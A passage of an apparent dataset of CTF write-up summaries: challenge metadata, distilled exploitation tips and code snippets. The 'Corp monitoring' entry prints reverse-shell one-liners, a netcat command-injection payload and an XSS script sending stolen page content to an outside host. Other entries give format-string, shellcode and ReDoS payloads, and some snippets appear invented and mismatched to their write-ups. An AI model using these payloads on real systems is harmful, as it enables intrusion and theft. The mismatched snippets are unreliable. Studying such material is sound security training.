            "When exploiting client-side web vulnerabilities, specifically those related to session storage and unsupported headers like `x-frame-options`, it's possible to frame the vulnerable web page in an attacker-controlled page. This can be leveraged in situations where the application fails to properly sanitize input or restrict frame embedding, allowing for potential cross-site scripting (XSS) or other client-side exploits. An iframe can be used to load the vulnerable application inside an attacker-controlled document, enabling interaction with the victim's session storage or exploiting other client-side vulnerabilities.",
            "In scenarios where a web application uses URL hash fragments (`location.hash`) for functionality such as searching or filtering content with JavaScript, controlling this URL component allows for Regex-based denial of service (DoS) attacks or other unintended interactions. Specifically, if an application executes a Regex search based on user-controllable URL fragments without proper validation or sanitization, attackers can craft malicious Regex patterns. These patterns can cause extensive processing time if they are designed to produce computational complexity or ambiguity, exploiting the service's Regex engine to perform actions like gradually leaking sensitive information through timing analysis or causing service disruption.\n\n   Example payload:\n   - Craft a Regular Expression that performs poorly or causes excessive computation: `^(?=justCTF{a).*.*.*.*.*.*.*.*.*.*ABCDE$`;\n   - The payload is included in the URL hash: `https://victim-site.com/#^(?=justCTF{a).*.*.*.*.*.*.*.*.*.*ABCDE$`."
        ],
        "key": "```js\nfunction searchNote(){  \n   location.hash = searchNoteInp.value;  \n}\n\n// triggers when the hash _changes_. Note that the initial page load is not\nconsidered a \"hash change\"  \nonhashchange = () => {  \n   // example.com#search_regex -> search_regex  \n   const reg = new RegExp(decodeURIComponent(location.hash.slice(1)));  \n   const found = [];  \n   // Compare the contents of all notes to the provided regex,  \n   // If they match, add their title to the \"found\" list  \n   notes.forEach(e=>{  \n       if(e.content.search(reg) !== -1){  \n           found.push(e.title);  \n       }  \n   });  \n   notesFound.innerHTML = found;  \n}  \n```"
    },
    {
        "name": "config-me",
        "write_up": "dataset/raw/config-me.md",
        "type": "reverse",
        "competition": [
            "BSidesSF/2020",
            "https://ctftime.org/event/977/tasks/"
        ],
        "score": 472,
        "max_score": 493,
        "difficulty": 0.9574036511156186,
        "knowledge": [
            "When faced with encrypted data in a configuration file used by an application, and the application has the functionality to decrypt certain fields, experiment with manipulating the configuration data to exploit this functionality. This approach can lead to decrypting sensitive data, such as a flag, by abusing the application's regular decryption capabilities, without needing direct access to the decryption algorithm or key. For example, if an encrypted flag is stored in a configuration file, modifying the configuration to present the encrypted flag value in a field that is decrypted and displayed by the application (like a username or name field) can reveal the decrypted flag.",
            "Reversing binaries written in languages that compile to complex or less common assembly, like Rust, can be challenging and time-consuming due to the language's unique features and optimizations. In such cases, opting for dynamic analysis techniques, such as monitoring the program's execution, manipulating input files or data, and observing the program's output, can be a more efficient approach to understand the program's functionality and identify vulnerabilities or key operations, especially in CTF challenges designed with simpler vulnerabilities for educational purposes."
        ],
        "key": "```rust\nfn decrypt(encrypted: &str) -> String {\n    // Example decryption logic\n    let key = \"some_key\";\n    let mut decrypted = String::new();\n    for (i, c) in encrypted.chars().enumerate() {\n        let key_c = key.chars().nth(i % key.len()).unwrap();\n        let decrypted_c = (c as u8 ^ key_c as u8) as char;\n        decrypted.push(decrypted_c);\n    }\n    decrypted\n}\n\nfn main() {\n    let config = read_config(\"config-me.conf\");\n    let name = decrypt(&config.name);\n    println!(\"Welcome back, {}!\", name);\n}\n\nfn read_config(file_path: &str) -> Config {\n    // Example config reading logic\n    Config {\n        name: \"E$af7ac775b3716f6d6ae96fdb6080ef41f4918e0b9f2837b82105b5da39\".to_string(),\n        // other fields...\n    }\n}\n\nstruct Config {\n    name: String,\n    // other fields...\n}\n```"
    },
    {
        "name": "Contrived Shellcode",
        "write_up": "dataset/raw/Contrived Shellcode.md",
        "type": "pwn",
        "competition": [
            "TAMUctf/2023",
            "https://ctftime.org/event/1914/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In shellcode challenges where only specific bytes are allowed due to filtering or restrictions, assembling desired instructions can be done by adding the values of permissible bytes to a register (e.g., `eax`) in a loop until the target opcode value is reached. This technique allows bypassing the limitation and executing restricted instructions like `pop rsi`. For example, to achieve an opcode value of `0x5e` for `pop rsi` without using `0x5e` directly, one could use a series of adds, such as `add al, 0xf` repeated six times and then `add al, 0x4`.\n   \n    Example payload to assemble `pop rsi`:\n    ```python\n    rsi_pop = asm('add al, 0xf')*6 + asm('add al, 0x4')\n    ```",
            "When constructing shellcode under severe restrictions, utilizing a two-stage shellcode approach can be beneficial. The first stage, adhering to the byte restrictions, can set up the environment (e.g., register values) and use a system call to read in a second, unrestricted stage shellcode into executable memory. This method effectively bypasses the byte limitations and allows for the execution of complex shellcodes.\n\n    Example for setting up and executing a second-stage shellcode:\n    ```python\n    # Setting up RSI, RDI, and RAX for SYS_read call in the first stage\n    stage1 += pop_rsi() + zero_edi() + big_edx() + zero_rax() + asm('syscall')\n    # Loading the second stage unrestricted shellcode\n    stage2 = asm(shellcraft.nop())*(len(stage1)+0x8*5) + asm(shellcraft.sh())\n    ```"
        ],
        "key": "```c\nunsigned char* code = mmap(NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE,\nMAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n```"
    },
    {
        "name": "Coronacation",
        "write_up": "dataset/raw/Coronacation.md",
        "type": "pwn",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 400,
        "max_score": 500,
        "difficulty": 0.8,
        "knowledge": [
            "Format string vulnerabilities can be exploited to perform both information leaks and arbitrary write operations. In the context of a CTF challenge with binary exploitation tasks, when dealing with a format string vulnerability, it is possible to leak memory addresses (such as base pointer and return address) to bypass protections like ASLR (Address Space Layout Randomization) and PIE (Position-Independent Executable). This is done by including specific format specifiers (%p for pointer leaks) in the input, which will make the program print out memory addresses. Payload construction for the leak might involve carefully choosing which position of the input corresponds to the memory address you want to leak, indicated by `%<position>$p`.\n   \n   Sample payload for leaking stack base pointer (rbp) and return address: `%14$p %15$p`",
            "After leaking necessary addresses, the next step involves overwriting a function's return address to redirect execution to a desired function (typically a `win` function in CTF challenges) to bypass PIE. This can involve calculating the offset to the return address, constructing a payload to overwrite it with the address of the `win` function. The technique of partial overwriting is useful here, particularly when the address space is large. This involves only overwriting the least significant bytes of the address if they suffice to redirect execution. In such cases, using `%hn` format specifier allows writing a short value (2 bytes) to a given address. The payload for overwriting will typically include a calculated number of characters to write followed by the `%hn` specifier and the address to overwrite, laid out in memory according to the calling convention and alignment requirements.\n\n   Sample payload for overwriting least significant bytes of a return address: `\"%NNNlx%8$hn\" + p64(address_to_overwrite)` where `NNN` is the number of characters to write to achieve the desired memory content at `address_to_overwrite`."
        ],
        "key": "```c  \n__int64 play_game()  \n{  \n __int64 result; // rax  \n char s; // [rsp+0h] [rbp-40h]\n\n puts(\"Welcome to this choose your own adventure game!\");  \n puts(\"You're President Ronald Drump and are tasked with leading the nation\nthrough this crisis.\");  \n puts(\"So what do you want to do?\");  \n puts(\"1. Close the borders.\");  \n puts(\"2. Tell everyone not to panic. It's just the Fake News media freaking\nout.\");  \n fgets(&s, 50, _bss_start);  \n printf(\"You chose: \", 50LL);  \n printf(&s);  \n if ( s == 49 )  \n   return close_borders();  \n result = 50 - (unsigned int)(unsigned __int8)s;  \n if ( s == 50 )  \n   result = no_panic();  \n return result;  \n}  \n```"
    },
    {
        "name": "Corp monitoring",
        "write_up": "dataset/raw/Corp monitoring.md",
        "type": "misc",
        "competition": [
            "VolgaCTF/2018/Quals",
            "https://ctftime.org/event/539/tasks/"
        ],
        "score": 200,
        "max_score": 500,
        "difficulty": 0.4,
        "knowledge": [
            "When exploiting server-side template injection vulnerabilities in web applications that process user-provided URLs, if the server-side language is Ruby, research relevant CVEs for the Ruby version in use to potentially identify exploitable vulnerabilities for gaining remote code execution (RCE). An effective approach could involve crafting a payload that initiates a reverse shell to an attacker-controlled server, allowing command execution. \n\n    Example payload for initiating a reverse shell in Ruby:\n    ```bash\n    |bash -c 'bash -i >& /dev/tcp/attacker_ip/port 0>&1'\n    ```",
            "For SQL Injection vulnerabilities particularly in search functionalities, if traditional MySQL error-based or boolean-based payloads fail and the application does not react in a typical manner to SQL syntax manipulation, consider the possibility of the backend database being non-traditional or using a different language for queries, such as Lua. This realization can significantly shift the injection strategy towards the syntax and functions available in that language, which may enable both injection and remote code execution (RCE) opportunities.\n\n    Example payload for exploiting Lua-based SQL Injection vulnerability:\n    ```lua\n    os.execute(\"sleep 10\")\n    ```"
        ],
        "key": "```ruby\ndef runAdmin(site)  \n  pid = Process.spawn(\"phantomjs --web-security=no bot.js '\" +  URI.escape(site) + \"'\")  \n  begin  \n    Timeout.timeout(1) do  \n      Process.wait(pid)  \n    end  \n  rescue Timeout::Error  \n    Process.kill('TERM', pid)  \n  end  \nend\n```\n\n```python\n#!/usr/bin/env python3  \n# Python 3.6.4  \nfrom pwn import *\n\nserver = listen(3306)\n\nserver.wait_for_connection()  \n# Server Greeting  \nserver.send(bytes.fromhex('4a0000000a352e372e32310007000000447601417b4f123700fff7080200ff8115000000000000000000005c121c5e6f7d387a4515755b006d7973716c5f6e61746976655f70617373776f726400'))  \n# Client login request  \nprint(server.recv())  \n# Server Response OK  \nserver.send(bytes.fromhex('0700000200000002000000'))  \n# Client SQL query  \nprint(server.recv())  \n# Server response with evil  \nquery_ok = bytes.fromhex('0700000200000002000000')  \ndump_etc_passwd = bytes.fromhex('0c000001fb2f6574632f706173737764')  \nserver.send(dump_etc_passwd)\n\n# This contains the flag VolgaCTF{hoz3foh3wah6ohbaiphahg6ooxumu8ieNg7Tonoo}  \nprint(server.recv())  \n```\n\n```html\n<script>  \nvar xhr = new XMLHttpRequest();  \nxhr.withCredentials = true;  \nxhr.open('GET', 'http://lazy-admin.quals.2018.volgactf.ru/profile.php', false);  \nxhr.send(null);  \nvar flag = btoa(xhr.responseText);  \ndocument.getElementById(\"image\").src = \"http://mywebsite.com/?a=\"+flag;  \n</script>  \n```\n\n```python\n#!/usr/bin/env python3  \n# Python 3.6.4  \nimport requests  \n# python3 pwntool  \nfrom pwn import *\n\nserver = listen(12345)  \nserver_result = listen(12346)\n\npayload = \"a';busybox$IFS$()nc$IFS$()1.2.3.4$IFS$()12345$IFS$()-esh;'\"  \nrequests.post('http://seo-kings.quals.2018.volgactf.ru:8080/', data=dict(site=payload))\n\ncmd = \"bash -c 'bash -i >& /dev/tcp/1.2.3.4/12346 0>&1'\"\n\nserver.wait_for_connection()  \nserver.sendline(cmd)  \nserver.close()  \nserver_result.wait_for_connection()  \nserver_result.interactive()  \n```"
    },
    {
        "name": "Corruption 500",
        "write_up": "dataset/raw/Corruption 500.md",
        "type": "misc",
        "competition": [
            "RITSEC/2021",
            "https://ctftime.org/event/1309/tasks/"
        ],
        "score": -1,
        "max_score": 925,
        "difficulty": -1,
        "knowledge": [
            "When encountering issues with cloning a Git repository due to compression errors or the presence of notably large files, a potential strategy involves manually salvaging the fetched `.git` folder before it is automatically deleted upon a failed cloning attempt. This allows for partial data recovery and further investigation into the repository's contents.",
            "In scenarios where a Git repository contains a corrupted branch preventing successful fetching of all contents, modifying the repository's `config` file to limit the fetch scope to a healthy branch can facilitate data recovery. Specifically, changing the `fetch` configuration in the `.git/config` file to focus on a single branch (e.g., from `fetch = +refs/heads/*:refs/remotes/origin/*` to `fetch = +refs/heads/master:refs/remotes/origin/master`) can bypass corruption in other branches. After implementing this change, executing `git fetch --all` allows for the retrieval of uncorrupted data."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    strcpy(buffer, input); // Vulnerable to buffer overflow\n}\n\nint main(int argc, char *argv[]) {\n    if (argc > 1) {\n        vulnerable_function(argv[1]);\n    } else {\n        printf(\"Please provide an input.\\n\");\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "Council Of Apes",
        "write_up": "dataset/raw/Council Of Apes.md",
        "type": "The type of challenge in this write-up is a pwn challenge.",
        "competition": [
            "Glacier/2023",
            "https://ctftime.org/event/1992/tasks/"
        ],
        "score": -1,
        "max_score": 428,
        "difficulty": -1,
        "knowledge": [
            "In the presence of a flash loan feature in a DeFi contract or system, careful examination of the token balance validation mechanism is crucial. If the totalSupply of a token involved in the system's operations (e.g., swaps, loans) is manually overridden or can be manipulated, it may lead to vulnerability exploitation by supplying incorrect supply data to influence the contract's state or operations. This scenario is particularly applicable when the token contract allows for overriding of values such as totalSupply, which are typically used to validate transaction legitimacy or the feasibility of loans and swaps.",
            "When exploiting vulnerabilities in smart contracts, especially in DeFi systems with complex mechanisms like pools, swaps, and loans, creating a custom token contract that overrides critical functions (such as totalSupply) can enable the manipulation of the system's expected behavior. This manipulation can facilitate actions such as obtaining loans under false pretenses or influencing the state of pools without proper collateral or backing. It becomes evident that the integrity of token metrics (like supply figures) is paramount in maintaining the security of financial mechanisms on blockchain systems. \n\nExample payload to manipulate contract state:\n```solidity\ncontract ShyToken is TotallyNotCopiedToken {  \n    constructor(address _owner, string memory _name, string memory _symbol)\n    TotallyNotCopiedToken(_owner, _name, _symbol) {  \n    }  \n    function totalSupply() public view override returns (uint256) {  \n        return 1337; // Override to return a manipulated value\n    }  \n}\n```"
        ],
        "key": "```solidity\ncontract ShyToken is TotallyNotCopiedToken {  \n   constructor(address _owner, string memory _name, string memory _symbol)\nTotallyNotCopiedToken(_owner, _name, _symbol) {  \n   }  \n   function totalSupply() public view override returns (uint256) {  \n       return 1337;  \n   }  \n}\n```"
    },
    {
        "name": "Courier",
        "write_up": "dataset/raw/Courier.md",
        "type": "reverse",
        "competition": [
            "TAMUctf/2023",
            "https://ctftime.org/event/1914/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting a difference in message handling between two components within a system (such as `courier` and `consignee` in a courier-delivery system emulation), an effective tactic is to create a message that is processed as valid by the initial handler (`courier`) but triggers an alternative processing path in the secondary handler (`consignee`). This can be achieved by crafting a message that meets the size and format requirements of the initial handler but includes a nested message formatted to exploit specific behavior in the secondary handler. Specifically, by utilizing the discrepancy in message length handling (`MAX_SIZE`) between the two components, an attacker can cause the second component to process an embedded message (e.g., `FlagRequest`) as if it were a top-level message, leading to unintended actions or information disclosure.  \nExample payload structure:  \n```python\nmessage = 'COURIERM'.encode() + [0x08, 0x00] + [0x00, 0x00] + 'COURIERM'.encode() + [0x00, 0x24] + [0x01, 0x0c] + [0x0d]*32 + [0x01, 0x01] + [0]*2058-len(message)\n```",
            "For embedded system emulations or simulations that involve UART communication between virtual devices, understanding and leveraging the serial communication setup and behavior can allow for interactive exploration and manipulation of the system. The ability to redirect `stdio` to a UART handle, as shown in setups with `qemu-system-arm` and `socat`, opens avenues for input/output manipulation, potentially leading to exploitation. In scenarios where such a system is part of a challenge, crafting input that manipulates or exploits the system\u2019s UART communication behavior can lead to revealing hidden functionality or extracting sensitive information (e.g., a flag)."
        ],
        "key": "```rust\nfn try_read_msg<B, const MAX_SIZE: usize, const CLEAR_ON_DESER: bool>(\n    buf: &mut B,\n) -> Result<Msg, ReadMsgError>\nwhere\n    B: Buffer,\n{\n    if buf.len() >= MSG_MAGIC.len() + core::mem::size_of::<u16>() {\n        let mut len_buf = [0u8; core::mem::size_of::<u16>()];\n        buf.iter()\n            .copied()\n            .skip(MSG_MAGIC.len())\n            .take(core::mem::size_of::<u16>())\n            .zip(&mut len_buf)\n            .for_each(|(b, e)| *e = b);\n        let msg_len = u16::from_be_bytes(len_buf);\n\n        if msg_len > MAX_SIZE as u16 {\n            buf.clear();\n            return Err(ReadMsgError::MessageTooLong);\n        }\n\n        if buf.len() >= MSG_MAGIC.len() + core::mem::size_of::<u16>() + msg_len as usize {\n            let value =\n                postcard::from_bytes(&buf[(MSG_MAGIC.len() + core::mem::size_of::<u16>())..])?;\n            if CLEAR_ON_DESER {\n                buf.clear();\n            }\n            return Ok(value);\n        }\n    }\n\n    if let Some(&last) = buf.last() {\n        if last != MSG_MAGIC[buf.len() - 1] {\n            buf.clear();\n            buf.push(last);\n        }\n    }\n\n    Err(ReadMsgError::NotYetDone)\n}\n```"
    },
    {
        "name": "Covid tracker tracker tracker",
        "write_up": "dataset/raw/Covid tracker tracker tracker.md",
        "type": "pwn",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 500,
        "max_score": 800,
        "difficulty": 0.625,
        "knowledge": [
            "When encountering a use-after-free vulnerability in a heap exploitation challenge, it's critical to recognize that even after a free operation is performed, pointers to the freed memory are not automatically set to NULL. This oversight allows an attacker to manipulate or access the previously freed memory space. This mistake can be exploited by carefully sequencing allocations and deallocations of memory to control the contents of the memory that is supposed to be freed and reused. This approach is a fundamental technique for exploiting use-after-free vulnerabilities.",
            "Bypassing Full RELRO (Read-Only Relocation) can be achieved by rewriting function pointers that libc allows to be hooked, such as `__free_hook`. By manipulating heap content to control such pointers, an attacker can redirect execution flow. This technique requires bypassing ASLR (Address Space Layout Randomization) by leaking libc addresses. Address leaks can usually be achieved by controlling a format string vulnerability or by forcing the application to output memory contents indirectly referenced by pointers controlled by the attacker. For instance, making a `char*` array element point to a GOT (Global Offset Table) entry and then reading it back can leak a libc address, providing a base from where other addresses (like `__free_hook` and `system`) can be calculated.\n\nExample Exploit Step:",
            "Allocate several objects to fill the heap.",
            "Free some objects but keep their pointers.",
            "Allocate again to get one of the freed object's locations.",
            "Write to this object to corrupt heap metadata or function pointers, such as making an entry in the GOT point to `__free_hook`.",
            "Use this corruption to achieve arbitrary code execution by, for example, changing `__free_hook` to the address of `system` and passing a controlled string to be executed."
        ],
        "key": "```c\nchar *urls[16];  \nchar is_deleted[16];\n\n// Add function\nvoid add(int index) {\n    urls[index] = malloc(sizeof(char) * 0x40);\n}\n\n// Edit function\nvoid edit(int index, char *input) {\n    strcpy(urls[index], input);\n}\n\n// Delete function\nvoid delete(int index) {\n    free(urls[index]);\n    is_deleted[index] = 1;\n}\n\n// List function\nvoid list() {\n    for (int i = 0; i < 16; i++) {\n        if (!is_deleted[i]) {\n            printf(\"%s\\n\", urls[i]);\n        }\n    }\n}\n```\n"
    },
    {
        "name": "Cplusplus",
        "write_up": "dataset/raw/Cplusplus.md",
        "type": "Based on the information provided in the CTF write-up, the type of challenge is: reverse",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 357,
        "max_score": 952,
        "difficulty": 0.375,
        "knowledge": [
            "When analyzing binary exploits related to parsing and input validation, it is crucial to examine the input format and validation logic. For situations where the application expects inputs in a specific format and separates values using delimiters, understanding the parsing mechanism (for example, `boost::spirit::qi::parse` in C++ for splitting the input based on delimiters and converting them to the desired data types) is vital. This knowledge helps in constructing payloads that bypass validations or exploit the system's logic. For instance, constructing an input payload like `78@111#34` that meets the parser's expected format (`num1@num2#num3`) and numeric constraints.",
            "In challenges leveraging pseudo-random number generators (PRNGs) like `boost::mt19937`, where the outcome of the PRNG affects the program's control flow or output, the key is understanding how the PRNG is seeded and manipulated. The PRNG's behavior (including state copying and how many values are discarded) can influence the correct value to provide or predict the PRNG output. An effective approach involves closely analyzing the seeding process, the operation applied on the seed (e.g., the number of discarded outputs using `num % 12` or `num / 12`), and the conditions that the PRNG's output must satisfy (e.g., matching a specific number like `3570126595`). Crafting a payload may include calculating or brute-forcing the seed value that leads to the desired PRNG output, considering the state copy behavior and discard operations."
        ],
        "key": "```C++\nstruct st {  \n\tunsigned short num1;  \n\tunsigned short num2;  \n\tunsigned short num3;  \n};\n\nst boostFn(const std::string& s) {  \n\tusing boost::spirit::qi::_1;  \n\tusing boost::spirit::qi::ushort_;  \n\tusing boost::spirit::qi::char_;  \n\tusing boost::phoenix::ref;\n\n\tstruct st res;  \n\tconst char* first = s.data();  \n\tconst char* const end = first + s.size();  \n\tbool success = boost::spirit::qi::parse(first, end,  \n\t\tushort_[ref(res.num1) = _1] >> char('@')  \n\t\t>> ushort_[ref(res.num2) = _1] >> char('#')  \n\t\t>> ushort_[ref(res.num3) = _1]  \n\t);\n\n\tif (!success || first != end) {  \n\t\t//throw std::logic_error(\"Parsing failed\");  \n\t\t_exit(0);  \n\t}  \n\treturn res;  \n}  \n\nvoid boostFunc(unsigned short& num) {  \n\t//random number check  \n\t//The expected num is 78  \n\tif (num > 111) {  \n\t\t_exit(0);  \n\t}  \n\tboost::mt19937 rng(num);  \n\trng.discard(num % 12);  \n\t//Copy Construction, retain all the state  \n\tboost::mt19937 rng_(rng);  \n\trng_.discard(num / 12);  \n\t//discarding num random results  \n\tif (rng_() != 3570126595) {  \n\t\t_exit(0);  \n\t}  \n\tnum -= (rng_() % 45);\t// 45  \n}  \n\nif ((res.num3 % res.num1 != 12) && (res.num3 / res.num1) != 3) {  \n\t\t//3 * 34 + 12 == 114  \n\t\tstd::cout << \"You failed...again\";  \n\t\t_exit(0);  \n\t}  \n```"
    },
    {
        "name": "CPP",
        "write_up": "dataset/raw/CPP.md",
        "type": "reverse",
        "competition": [
            "GoogleCTF/2021",
            "https://ctftime.org/event/1318/tasks/"
        ],
        "score": 75,
        "max_score": 233123.2321,
        "difficulty": 0.00032171825744003145,
        "knowledge": [
            "When given a CTF challenge involving a complex program, especially one that involves recursive inclusion, symbolic execution can be very useful. Symbolic execution refers to analyzing a program to determine what inputs cause each part of a program to execute. If a direct approach to understanding or running the program is infeasible (due to obfuscation, size, or complexity), manually reverse-engineering critical parts of the logic and then simulating or re-implementing this logic in a more tractable environment like Python can lead to success. This approach is particularly effective when the program logic includes conditional compilation, self-inclusion, or manipulates variables in a predictable but non-obvious manner.",
            "When dealing with obfuscated programs that implement algorithmic checks (like checking a flag against a hardcoded value) through preprocessor directives, macros, or other compile-time evaluations, reduce the problem to its mathematical or logical essence. In scenarios where the program's logic performs operations like bitwise manipulation, arithmetic operations, or lookups from a hardcoded data structure (like a ROM in the presented challenge), this logic can often be extracted and implemented in constraint-solving frameworks such as Z3. This allows for automated solving of conditions required to reach a desired state (e.g., a \"valid flag\" message) without manually tracing through the obfuscated or convoluted original source code."
        ],
        "key": "```c\n#if __INCLUDE_LEVEL__ == 0  \n   // Preliminary stuff:  \n   // - Define flag characters  \n   // - Define constants and ROM  \n   // - Define `LD` macros, used to load values from ROM  \n   // - Set variable S = 0  \n#endif\n\n#if __INCLUDE_LEVEL__ > 12  \n   // Flag checking logic\n\n   #if S == 0  \n       #undef S  \n       #define S 1  \n       #undef S  \n       #define S 24  \n   #endif  \n   #if S == 1  \n       #undef S  \n       #define S 2  \n       #ifdef R0  \n           #undef R0  \n       #else  \n           #define R0  \n       #endif  \n       #ifdef R1  \n           #undef R1  \n       #else  \n           #define R1  \n       #endif  \n       // ...  \n       #ifdef R7  \n           #undef R7  \n       #else  \n           #define R7  \n       #endif  \n   #endif  \n   #if S == 2  \n       #undef S  \n       #define S 3  \n       #define Z0  \n       #undef Z1  \n       #undef Z2  \n       #undef Z3  \n       #undef Z4  \n       #undef Z5  \n       #undef Z6  \n       #undef Z7  \n   #endif  \n   #if S == 3  \n       #undef S  \n       #define S 4  \n       #undef c  \n       #ifndef R0  \n           #ifndef Z0  \n               #ifdef c  \n                   #define R0  \n                   #undef c  \n               #endif  \n           #else  \n               #ifndef c  \n                   #define R0  \n                   #undef c  \n               #endif  \n           #endif  \n       #else  \n           #ifndef Z0  \n               #ifdef c  \n                   #undef R0  \n                   #define c  \n               #endif  \n           #else  \n               #ifndef c  \n                   #undef R0  \n                   #define c  \n               #endif  \n           #endif  \n       #endif  \n       // Same thing for R1 - R7  \n   #endif  \n   #if S == 34  \n       #undef S  \n       #define S 35  \n       #undef l0  \n       #ifdef B0  \n           #define l0 1  \n       #else  \n           #define l0 0  \n       #endif  \n       // Same thing for B1 - B7  \n       #if LD(l, 0)  \n           #define A0  \n       #else  \n           #undef A0  \n       #endif  \n       // Same thing for A1 - A7  \n   #endif  \n   #if S == 56  \n       #undef S  \n       #define S 57  \n       #if Q == 0  \n           #undef S  \n           #define S -1  \n       #endif  \n   #endif  \n   #if S == 57  \n       #undef S  \n       #define S 58  \n       #error \"INVALID_FLAG\"  \n   #endif  \n   #if S == 58  \n       #undef S  \n       #define S 59  \n       #undef S  \n       #define S -1  \n   #endif  \n#else  \n   // The program includes itself twice in each recursive include, and  \n   // 604 times in total  \n   #if S != -1  \n       #include \"cpp.c\"  \n   #endif  \n   #if S != -1  \n       #include \"cpp.c\"  \n   #endif  \n#endif\n\n#if __INCLUDE_LEVEL__ == 0  \n   #if S != -1  \n       #error \"Failed to execute program\"  \n   #endif\n\n   #include <stdio.h>  \n   int main() {  \n       printf(\"Key valid. Enjoy your program!\\n\");  \n       printf(\"2+2 = %d\\n\", 2+2);  \n   }  \n#endif  \n```"
    },
    {
        "name": "Crack-a-Mateo",
        "write_up": "dataset/raw/Crack-a-Mateo.md",
        "type": "crypto",
        "competition": [
            "JerseyCTF/2024",
            "https://ctftime.org/event/2230/tasks/"
        ],
        "score": 493,
        "max_score": 1000,
        "difficulty": 0.493,
        "knowledge": [
            "When faced with a challenge that requires cracking a password, and personal information about the target is available, one can utilize specialized password-generating tools like CUPP (Common User Passwords Profiler) to create a tailored dictionary. This approach leverages personal information (e.g., names, birthdates, keywords related to the victim) to generate a comprehensive list of possible passwords, improving the efficiency of the attack by focusing on likely password combinations.",
            "For cracking encrypted files (like a PDF in the provided example) with known password hashes, using John the Ripper with a custom wordlist generated through methods described in point 1 is an effective strategy. This approach combines the strengths of a personalized attack dictionary with the powerful cracking capabilities of John the Ripper, allowing for the decryption of files protected by passwords that could be guessed from the victim's personal information.\n   \n   Example command: `john --wordlist=mateo.txt pdf.hash`"
        ],
        "key": "```python\ndef check_password(input_password):\n    correct_password = \"m3l14!@'#'\"\n    if input_password == correct_password:\n        return True\n    else:\n        return False\n\n# Example of vulnerable code\nuser_input = input(\"Enter password: \")\nif check_password(user_input):\n    print(\"Access granted\")\nelse:\n    print(\"Access denied\")\n```"
    },
    {
        "name": "Crackme",
        "write_up": "dataset/raw/Crackme.md",
        "type": "pwn",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "In a challenge involving understanding or exploiting a binary's behavior, specifically one that returns encoded or specific strings based on the input, employ a brute-force script to test inputs against the expected output. This can be effectively utilized when the binary gives different responses based on the correctness of the input, allowing for incremental discovery of the correct input (flag). Utilize a character set that matches the challenge's criteria and iterate through it, adjusting the script to compare the binary's response with the expected output, and append the correctly guessed characters to an accumulator variable until the full flag is reconstructed.\n    - Example algorithm (simplified):\n        ```python\n        def brute_force_binary(flag_partial, expected_output):\n            chars = 'possible_characters'  \n            for char in chars:\n                # Send char to binary and get the output\n                output = test_binary_with_input(flag_partial + char)\n                # Check if output matches expected output\n                if output starts with expected_output:\n                    return char\n        ```",
            "When dealing with a binary or script that has varying response times based on the correctness of the input, a timeout can be implemented in the receiving function to significantly speed up a brute-force attack. Specifically, if the script or binary under test returns the output instantaneously for correct guesses and with a delay for incorrect guesses, setting a timeout shorter than the delay allows the brute-force script to identify correct inputs much faster. This optimization is especially useful in blackbox testing scenarios where the internal workings of the program are unknown but its input/output behavior can be observed.\n    - Example payload adjustment (simplified):\n        ```python\n        def optimized_test(input):\n            with process('binary_name') as proc:\n                proc.sendline(input)\n                # Set a timeout shorter than the known delay for incorrect guesses\n                return proc.recv(timeout=optimization_timeout)\n        ```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n\nint main() {\n    char input[100];\n    char correct_flag[] = \"F#{M4k3_R3v3rse_gr3at_Ag41N}\";\n    char description[] = \"H4ck1ng Fl4m3s In th3 Sh3lL\";\n\n    printf(\"Enter the flag: \");\n    fgets(input, sizeof(input), stdin);\n    input[strcspn(input, \"\\n\")] = 0; // Remove newline character\n\n    if (strncmp(input, correct_flag, strlen(input)) == 0) {\n        printf(\"%s\\n\", description);\n    } else {\n        sleep(5); // Delay to simulate processing time\n        printf(\"Incorrect flag\\n\");\n    }\n\n    return 0;\n}\n```"
    },
    {
        "name": "Crackme",
        "write_up": "dataset/raw/Crackme.sol.md",
        "type": "web",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When facing a challenge that involves interacting with a smart contract function on the Ethereum blockchain which has unusual parameter conditions, understand that these conditions could often involve typical computation operations with a twist. For example, if a function parameter must satisfy a condition that seems impossible (like a number being both greater than 0 and, when incremented, less than 1), consider integer overflow possibilities. Unsigned integer overflow can be particularly relevant in contracts written in Solidity, as this language uses 256-bit unsigned integers. The maximum value of a 256-bit unsigned integer is \\(2^{256} - 1\\), and adding 1 to this number will cause it to overflow back to 0.",
            "To interact with Ethereum smart contracts from a Python environment, the `web3.py` library can be utilized. This library allows for easy interaction with the Ethereum blockchain. To use it:\n   - Initially, configure a connection to an Ethereum node. This can be done by providing the HTTPProvider with a node URL, which can be obtained from services like Infura.\n   - Utilize the middleware stack provided by `web3.py`, such as `geth_poa_middleware`, to overcome common issues related to Ethereum's Proof of Authority (PoA) networks.\n   - Generate the ABI (Application Binary Interface) of the contract to interface with its functions.\n   - Use the contract address and ABI to create a contract object in Web3.py, then interact with the contract's functions (such as sending transactions or calling view functions).\n   \nSample code snippet for calling a smart contract function:\n```python\nfrom web3 import Web3, HTTPProvider\nfrom web3.middleware import geth_poa_middleware\n\nw3 = Web3(Web3.HTTPProvider('<NODE_URL>')) # Replace <NODE_URL> with your Ethereum node URL\nw3.middleware_onion.inject(geth_poa_middleware, layer=0)\n\ncontract_address = '0xCONTRACT_ADDRESS' # Replace CONTRACT_ADDRESS with the actual address\nabi = '[ABI]' # Replace [ABI] with the actual contract ABI\n\ncontract = w3.eth.contract(address=contract_address, abi=abi)\nresult = 